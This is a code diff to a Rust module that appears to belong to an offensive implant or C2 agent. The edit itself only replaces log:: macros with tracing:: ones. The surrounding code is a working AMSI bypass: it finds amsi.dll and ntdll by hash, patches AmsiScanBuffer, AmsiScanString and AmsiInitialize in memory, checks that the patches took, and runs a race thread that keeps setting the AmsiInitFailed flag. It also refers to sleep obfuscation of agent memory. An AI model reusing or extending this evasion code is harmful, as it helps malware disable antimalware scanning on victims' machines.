@@ -301,7 +301,7 @@ fn apply_memory_patch() {
         let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
             Some(b) => b as *mut std::ffi::c_void,
             None => {
-                log::debug!("apply_memory_patch: amsi.dll not loaded — nothing to patch");
+                tracing::debug!("apply_memory_patch: amsi.dll not loaded — nothing to patch");
                 return;
             }
         };
@@ -313,7 +313,7 @@ fn apply_memory_patch() {
         {
             Some(addr) => addr as *mut std::ffi::c_void,
             None => {
-                log::warn!("apply_memory_patch: AmsiScanBuffer not found");
+                tracing::warn!("apply_memory_patch: AmsiScanBuffer not found");
                 return;
             }
         };
@@ -325,9 +325,9 @@ fn apply_memory_patch() {
         if nt_protect(scan_buf, patch.len(), PAGE_READWRITE, &mut old_protect) {
             std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_buf as *mut u8, patch.len());
             nt_protect(scan_buf, patch.len(), old_protect, &mut old_protect);
-            log::debug!("apply_memory_patch: AmsiScanBuffer patched");
+            tracing::debug!("apply_memory_patch: AmsiScanBuffer patched");
         } else {
-            log::warn!("apply_memory_patch: NtProtectVirtualMemory failed for AmsiScanBuffer");
+            tracing::warn!("apply_memory_patch: NtProtectVirtualMemory failed for AmsiScanBuffer");
         }
 
         // Also patch AmsiScanString
@@ -475,9 +475,9 @@ fn set_init_failed_flag() {
         if nt_protect(init_fn, patch.len(), win_resolve::PAGE_READWRITE, &mut old) {
             std::ptr::copy_nonoverlapping(patch.as_ptr(), init_fn as *mut u8, patch.len());
             nt_protect(init_fn, patch.len(), old, &mut old);
-            log::debug!("set_init_failed_flag: AmsiInitialize patched to return E_FAIL");
+            tracing::debug!("set_init_failed_flag: AmsiInitialize patched to return E_FAIL");
         } else {
-            log::warn!("set_init_failed_flag: NtProtectVirtualMemory failed for AmsiInitialize");
+            tracing::warn!("set_init_failed_flag: NtProtectVirtualMemory failed for AmsiInitialize");
         }
     }
 }
@@ -520,7 +520,7 @@ pub fn verify_bypass() -> bool {
                     && bytes[4] == 0x00
                     && bytes[5] == 0xC3); // mov eax,0; ret
             if !ok {
-                log::warn!(
+                tracing::warn!(
                     "verify_bypass: AmsiScanBuffer not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
                     bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
                 );
@@ -542,7 +542,7 @@ pub fn verify_bypass() -> bool {
                     && bytes[4] == 0x00
                     && bytes[5] == 0xC3);
             if !ok {
-                log::warn!(
+                tracing::warn!(
                     "verify_bypass: AmsiScanString not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
                     bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
                 );
@@ -563,7 +563,7 @@ pub fn verify_bypass() -> bool {
                 && bytes[4] == 0x80
                 && bytes[5] == 0xC3;
             if !ok {
-                log::warn!(
+                tracing::warn!(
                     "verify_bypass: AmsiInitialize not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
                     bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
                 );
@@ -682,7 +682,7 @@ mod write_raid {
                     let target = (rip_after_insn as i64 + disp as i64) as usize;
                     // Verify the target is within the amsi module range.
                     if is_within_amsi_data(amsi_base, target) {
-                        log::debug!(
+                        tracing::debug!(
                             "write_raid: found AmsiInitFailed at {:#x} via mov [rip+disp], 1",
                             target
                         );
@@ -701,7 +701,7 @@ mod write_raid {
                 let rip_after_insn = init_fn + i + 6;
                 let target = (rip_after_insn as i64 + disp as i64) as usize;
                 if is_within_amsi_data(amsi_base, target) {
-                    log::debug!(
+                    tracing::debug!(
                         "write_raid: found candidate AmsiInitFailed at {:#x} via mov byte [rip+disp]",
                         target
                     );
@@ -710,7 +710,7 @@ mod write_raid {
             }
         }
 
-        log::warn!("write_raid: could not locate AmsiInitFailed via pattern scan");
+        tracing::warn!("write_raid: could not locate AmsiInitFailed via pattern scan");
         None
     }
 
@@ -767,7 +767,7 @@ mod write_raid {
         let has_session = !session_ptr.is_null();
 
         if !has_init && !has_session {
-            log::error!("write_raid: no valid targets — thread exiting");
+            tracing::error!("write_raid: no valid targets — thread exiting");
             ACTIVE.store(false, Ordering::Release);
             return;
         }
@@ -779,7 +779,7 @@ mod write_raid {
         let ntdll_base = match pe_resolve::get_module_handle_by_hash(ntdll_hash) {
             Some(b) => b,
             None => {
-                log::error!("write_raid: cannot resolve ntdll — thread exiting");
+                tracing::error!("write_raid: cannot resolve ntdll — thread exiting");
                 ACTIVE.store(false, Ordering::Release);
                 return;
             }
@@ -791,7 +791,7 @@ mod write_raid {
         {
             Some(a) => a,
             None => {
-                log::error!("write_raid: cannot resolve NtWriteVirtualMemory — thread exiting");
+                tracing::error!("write_raid: cannot resolve NtWriteVirtualMemory — thread exiting");
                 ACTIVE.store(false, Ordering::Release);
                 return;
             }
@@ -805,7 +805,7 @@ mod write_raid {
             super::win_resolve::HASH_SWITCHTOTHREAD,
         );
 
-        log::info!("write_raid: race thread started");
+        tracing::info!("write_raid: race thread started");
 
         while !STOP_REQUESTED.load(Ordering::Relaxed) {
             // ── Pause gate ──────────────────────────────────────────────
@@ -882,7 +882,7 @@ mod write_raid {
             }
         }
 
-        log::info!("write_raid: race thread exiting (stop requested)");
+        tracing::info!("write_raid: race thread exiting (stop requested)");
         ACTIVE.store(false, Ordering::Release);
     }
 
@@ -925,7 +925,7 @@ mod write_raid {
             .map_err(|e| anyhow::anyhow!("lock poisoned: {e}"))?;
 
         if ACTIVE.load(Ordering::Acquire) {
-            log::debug!("write_raid: already active — skipping");
+            tracing::debug!("write_raid: already active — skipping");
             return Ok(());
         }
 
@@ -990,7 +990,7 @@ mod write_raid {
                     let tid = get_thread_id(thread_handle);
                     RAID_THREAD_ID.store(tid, Ordering::Release);
 
-                    log::info!(
+                    tracing::info!(
                         "write_raid: enabled — AmsiInitFailed at {:#x}, thread handle {:#x}, tid {}",
                         flag_addr, thread_handle, tid
                     );
@@ -1015,7 +1015,7 @@ mod write_raid {
             .map_err(|e| anyhow::anyhow!("lock poisoned: {e}"))?;
 
         if !ACTIVE.load(Ordering::Acquire) {
-            log::debug!("write_raid: not active — nothing to disable");
+            tracing::debug!("write_raid: not active — nothing to disable");
             return Ok(());
         }
 
@@ -1070,7 +1070,7 @@ mod write_raid {
         SESSION_RESULT_ADDR.store(0, Ordering::Release);
         RAID_THREAD_ID.store(0, Ordering::Release);
 
-        log::info!("write_raid: disabled");
+        tracing::info!("write_raid: disabled");
         Ok(())
     }
 
@@ -1093,7 +1093,7 @@ mod write_raid {
     pub fn pause() {
         if ACTIVE.load(Ordering::Acquire) {
             PAUSE_REQUESTED.store(true, Ordering::Release);
-            log::debug!("write_raid: pause requested");
+            tracing::debug!("write_raid: pause requested");
         }
     }
 
@@ -1102,7 +1102,7 @@ mod write_raid {
     /// Called by sleep obfuscation after decrypting agent memory.
     pub fn resume() {
         PAUSE_REQUESTED.store(false, Ordering::Release);
-        log::debug!("write_raid: resume requested");
+        tracing::debug!("write_raid: resume requested");
     }
 
     /// Thread entry point trampoline.  `CreateThread` expects a
